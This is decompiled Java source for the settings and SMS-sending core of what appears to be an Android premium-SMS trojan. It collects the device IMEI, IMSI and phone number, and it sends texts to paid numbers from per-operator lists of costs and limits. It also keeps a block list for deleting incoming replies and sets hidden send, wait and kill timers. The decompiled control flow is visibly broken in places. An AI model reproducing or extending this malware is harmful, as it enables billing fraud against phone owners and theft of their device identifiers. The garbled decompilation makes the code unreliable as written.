package install.app;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.Time;
import java.io.PrintStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings
{
  public static int DAY;
  public static int HOUR;
  public static int MINUTE;
  public static int SECOND;
  public static String SETTINGS = "settings";
  public static String imei = "";
  public static String imsi = "";
  static Settings settings;
  public static boolean timeNotActual;
  public Vector<String> aosList = null;
  public Vector<String> blockList = null;
  public int currentGlobalMaxSmsCount = 0;
  public int currentMaxSmsCost = 0;
  public int currentMaxSmsCount = 0;
  public int currentOperatorId = 0;
  public int currentOperatorIndex = 0;
  public int currentSmsIndex = 0;
  public long currentSmsKey = 0L;
  public boolean defaultSet = false;
  public int globalMaxSmsCount = 0;
  public int globalRepeat = 0;
  public long lastTimeGlobalRepeat = 0L;
  public Vector<SmsOperator> operatorList = null;
  public long waitForSend;
  public boolean working = false;
  
  static
  {
    SECOND = 1000;
    MINUTE = SECOND * 60;
    HOUR = MINUTE * 60;
    DAY = HOUR * 24;
    timeNotActual = false;
  }
  
  public Settings() {}
  
  public static void cancelWaitTimer(Context paramContext)
  {
    try
    {
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.timer.wait");
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).cancel((PendingIntent)localObject);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static String getCountry(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getSimCountryIso();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getCurrentTime()
  {
    Time localTime = new Time();
    localTime.setToNow();
    return localTime.format("%Y_%m_%d_%H_%M_%S");
  }
  
  public static String getImei(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getDeviceId();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getImsi(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getSubscriberId();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getPhone(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getLine1Number();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static Settings getSettings()
  {
    return settings;
  }
  
  public static boolean loadSettings(Context paramContext)
  {
    if (getSettings() == null)
    {
      Settings localSettings = new Settings();
      setSettings(localSettings);
      return localSettings.load(paramContext);
    }
    return true;
  }
  
  public static String md5(String paramString)
  {
    try
    {
      Object localObject = MessageDigest.getInstance("MD5");
      ((MessageDigest)localObject).update(paramString.getBytes());
      paramString = ((MessageDigest)localObject).digest();
      localObject = new StringBuffer();
      int i = 0;
      for (;;)
      {
        if (i >= paramString.length) {
          return ((StringBuffer)localObject).toString();
        }
        String str = Integer.toHexString(paramString[i] & 0xFF);
        if (str.length() == 1) {
          ((StringBuffer)localObject).append("0");
        }
        ((StringBuffer)localObject).append(str);
        i += 1;
      }
      return "";
    }
    catch (NoSuchAlgorithmException paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static boolean sendSms(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = paramString2.replace("{IMEI}", imei).replace("{IMSI}", imsi);
      System.out.println("sms: " + paramString2 + " to " + paramString1);
      SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, null, null);
      return true;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
    return false;
  }
  
  public static void setSettings(Settings paramSettings)
  {
    settings = paramSettings;
  }
  
  public static void startKillTimer(Context paramContext, long paramLong)
  {
    try
    {
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.timer.kill");
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, System.currentTimeMillis() + MINUTE * paramLong, (PendingIntent)localObject);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startSendTimer(Context paramContext, long paramLong)
  {
    try
    {
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.timer.send");
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, System.currentTimeMillis() + SECOND * paramLong, (PendingIntent)localObject);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startWaitTimer(Context paramContext, long paramLong)
  {
    timeNotActual = false;
    try
    {
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.timer.wait");
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, System.currentTimeMillis() + SECOND * paramLong, (PendingIntent)localObject);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public boolean isAosMessage(String paramString1, String paramString2)
  {
    int i = 0;
    for (;;)
    {
      if (i >= this.aosList.size()) {
        return false;
      }
      if (paramString1.startsWith((String)this.aosList.get(i))) {
        return true;
      }
      i += 1;
    }
  }
  
  public boolean isDeleteMessage(String paramString1, String paramString2)
  {
    int i = 0;
    for (;;)
    {
      if (i >= this.blockList.size()) {
        return false;
      }
      if (((String)this.blockList.get(i)).equals(paramString1)) {
        return true;
      }
      i += 1;
    }
  }
  
  public boolean load(Context paramContext)
  {
    bool2 = false;
    System.out.println("Settings::load() start");
    for (;;)
    {
      try
      {
        imei = getImei(paramContext);
        imsi = getImsi(paramContext);
        paramContext = paramContext.getSharedPreferences(SETTINGS, 1);
        bool1 = bool2;
        if (paramContext.contains("first"))
        {
          localJSONArray = new JSONArray(paramContext.getString("operatorList", ""));
          this.operatorList = new Vector();
          i = 0;
          if (i < localJSONArray.length()) {
            continue;
          }
          localJSONArray = new JSONArray(paramContext.getString("blockList", ""));
          this.blockList = new Vector();
          i = 0;
          if (i < localJSONArray.length()) {
            continue;
          }
          localJSONArray = new JSONArray(paramContext.getString("aosList", ""));
          this.aosList = new Vector();
          i = 0;
          if (i < localJSONArray.length()) {
            continue;
          }
          this.currentOperatorId = paramContext.getInt("currentOperatorId", 0);
          this.currentSmsKey = paramContext.getLong("currentSmsKey", 0L);
          this.currentMaxSmsCount = paramContext.getInt("currentMaxSmsCount", 0);
          this.currentMaxSmsCost = paramContext.getInt("currentMaxSmsCost", 0);
          this.currentOperatorIndex = paramContext.getInt("currentOperatorIndex", 0);
          this.currentSmsIndex = paramContext.getInt("currentSmsIndex", 0);
          this.working = paramContext.getBoolean("working", false);
          this.defaultSet = paramContext.getBoolean("defaultSet", false);
          this.waitForSend = paramContext.getLong("waitForSend", 0L);
          this.globalMaxSmsCount = paramContext.getInt("globalMaxSmsCount", 0);
          this.globalRepeat = paramContext.getInt("globalRepeat", 0);
          this.lastTimeGlobalRepeat = paramContext.getLong("lastTimeGlobalRepeat", 0L);
          this.currentGlobalMaxSmsCount = paramContext.getInt("currentGlobalMaxSmsCount", 0);
          bool1 = true;
        }
      }
      catch (Exception paramContext)
      {
        JSONArray localJSONArray;
        int i;
        Object localObject1;
        SmsOperator localSmsOperator;
        Object localObject2;
        int j;
        SmsItem localSmsItem;
        paramContext.printStackTrace();
        boolean bool1 = bool2;
        continue;
      }
      System.out.println("Settings::load() end");
      return bool1;
      localObject1 = localJSONArray.getJSONObject(i);
      localSmsOperator = new SmsOperator();
      localSmsOperator.id = ((JSONObject)localObject1).getInt("id");
      localSmsOperator.name = ((JSONObject)localObject1).getString("name");
      localSmsOperator.maxSmsCount = ((JSONObject)localObject1).getInt("maxSmsCount");
      localSmsOperator.maxSmsCost = ((JSONObject)localObject1).getInt("maxSmsCost");
      localSmsOperator.repeat = ((JSONObject)localObject1).getInt("repeat");
      localSmsOperator.time = ((JSONObject)localObject1).getLong("time");
      localObject2 = ((JSONObject)localObject1).getJSONArray("codes");
      j = 0;
      if (j >= ((JSONArray)localObject2).length())
      {
        localObject1 = ((JSONObject)localObject1).getJSONArray("sms");
        j = 0;
        if (j >= ((JSONArray)localObject1).length())
        {
          this.operatorList.add(localSmsOperator);
          i += 1;
        }
      }
      else
      {
        localSmsOperator.codes.add(((JSONArray)localObject2).getString(j));
        j += 1;
        continue;
      }
      localObject2 = ((JSONArray)localObject1).getJSONObject(j);
      localSmsItem = new SmsItem(((JSONObject)localObject2).getString("number"), ((JSONObject)localObject2).getString("text"));
      localSmsItem.cost = ((JSONObject)localObject2).getInt("cost");
      localSmsItem.wait = ((JSONObject)localObject2).getInt("wait");
      localSmsItem.responseText = ((JSONObject)localObject2).getString("responseText");
      localSmsItem.responseNumber = ((JSONObject)localObject2).getString("responseNumber");
      localSmsItem.key = ((JSONObject)localObject2).getLong("key");
      localSmsOperator.sms.add(localSmsItem);
      j += 1;
      continue;
      this.blockList.add(localJSONArray.getString(i));
      i += 1;
      continue;
      this.aosList.add(localJSONArray.getString(i));
      i += 1;
    }
  }
  
  public SmsOperator loadCurrentOperator()
  {
    return (SmsOperator)this.operatorList.get(this.currentOperatorIndex);
  }
  
  public SmsItem loadCurrentSmsItem()
  {
    return (SmsItem)((SmsOperator)this.operatorList.get(this.currentOperatorIndex)).sms.get(this.currentSmsIndex);
  }
  
  public void printTimes()
  {
    System.out.println("==================TIMES====================");
    int i = 0;
    for (;;)
    {
      if (i >= this.operatorList.size())
      {
        System.out.println("============================================");
        return;
      }
      SmsOperator localSmsOperator = (SmsOperator)this.operatorList.get(i);
      System.out.println(localSmsOperator.name + " operator[" + i + "].time: " + localSmsOperator.time);
      i += 1;
    }
  }
  
  public void printToOutStream() {}
  
  public void reset(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences(SETTINGS, 2).edit();
      paramContext.clear();
      paramContext.commit();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public boolean save(Context paramContext)
  {
    System.out.println("Settings::save() start");
    for (;;)
    {
      try
      {
        paramContext = paramContext.getSharedPreferences(SETTINGS, 2).edit();
        paramContext.putBoolean("first", false);
        localJSONArray1 = new JSONArray();
        i = 0;
        if (i < this.operatorList.size()) {
          continue;
        }
        paramContext.putString("operatorList", localJSONArray1.toString());
        localJSONArray1 = new JSONArray();
        i = 0;
        if (i < this.blockList.size()) {
          continue;
        }
        paramContext.putString("blockList", localJSONArray1.toString());
        localJSONArray1 = new JSONArray();
        i = 0;
        if (i < this.aosList.size()) {
          continue;
        }
        paramContext.putString("aosList", localJSONArray1.toString());
        paramContext.putInt("currentOperatorId", this.currentOperatorId);
        paramContext.putLong("currentSmsKey", this.currentSmsKey);
        paramContext.putInt("currentMaxSmsCount", this.currentMaxSmsCount);
        paramContext.putInt("currentMaxSmsCost", this.currentMaxSmsCost);
        paramContext.putInt("currentOperatorIndex", this.currentOperatorIndex);
        paramContext.putInt("currentSmsIndex", this.currentSmsIndex);
        paramContext.putBoolean("working", this.working);
        paramContext.putBoolean("defaultSet", this.defaultSet);
        paramContext.putLong("waitForSend", this.waitForSend);
        paramContext.putInt("globalMaxSmsCount", this.globalMaxSmsCount);
        paramContext.putInt("globalRepeat", this.globalRepeat);
        paramContext.putLong("lastTimeGlobalRepeat", this.lastTimeGlobalRepeat);
        paramContext.putInt("currentGlobalMaxSmsCount", this.currentGlobalMaxSmsCount);
        paramContext.commit();
      }
      catch (Exception paramContext)
      {
        JSONArray localJSONArray1;
        int i;
        SmsOperator localSmsOperator;
        JSONObject localJSONObject1;
        JSONArray localJSONArray2;
        int j;
        SmsItem localSmsItem;
        JSONObject localJSONObject2;
        paramContext.printStackTrace();
        continue;
      }
      System.out.println("Settings::save() end");
      return false;
      localSmsOperator = (SmsOperator)this.operatorList.get(i);
      localJSONObject1 = new JSONObject();
      localJSONObject1.put("id", localSmsOperator.id);
      localJSONObject1.put("name", localSmsOperator.name);
      localJSONObject1.put("maxSmsCount", localSmsOperator.maxSmsCount);
      localJSONObject1.put("maxSmsCost", localSmsOperator.maxSmsCost);
      localJSONObject1.put("repeat", localSmsOperator.repeat);
      localJSONObject1.put("time", localSmsOperator.time);
      localJSONArray2 = new JSONArray();
      j = 0;
      if (j >= localSmsOperator.codes.size())
      {
        localJSONObject1.put("codes", localJSONArray2);
        localJSONArray2 = new JSONArray();
        j = 0;
        if (j >= localSmsOperator.sms.size())
        {
          localJSONObject1.put("sms", localJSONArray2);
          localJSONArray1.put(localJSONObject1);
          i += 1;
        }
      }
      else
      {
        localJSONArray2.put(localSmsOperator.codes.get(j));
        j += 1;
        continue;
      }
      localSmsItem = (SmsItem)localSmsOperator.sms.get(j);
      localJSONObject2 = new JSONObject();
      localJSONObject2.put("number", localSmsItem.number);
      localJSONObject2.put("text", localSmsItem.text);
      localJSONObject2.put("cost", localSmsItem.cost);
      localJSONObject2.put("wait", localSmsItem.wait);
      localJSONObject2.put("responseText", localSmsItem.responseText);
      localJSONObject2.put("responseNumber", localSmsItem.responseNumber);
      localJSONObject2.put("key", localSmsItem.key);
      localJSONArray2.put(localJSONObject2);
      j += 1;
      continue;
      localJSONArray1.put(this.blockList.get(i));
      i += 1;
      continue;
      localJSONArray1.put(this.aosList.get(i));
      i += 1;
    }
  }
  
  public void updateCurrentMaxSmsCount()
  {
    long l = System.currentTimeMillis();
    if (this.lastTimeGlobalRepeat + this.globalRepeat * MINUTE <= l) {
      this.currentGlobalMaxSmsCount = this.globalMaxSmsCount;
    }
  }
  
  public void updateCurrentOperator(SmsOperator paramSmsOperator)
  {
    this.operatorList.set(this.currentOperatorIndex, paramSmsOperator);
  }
}
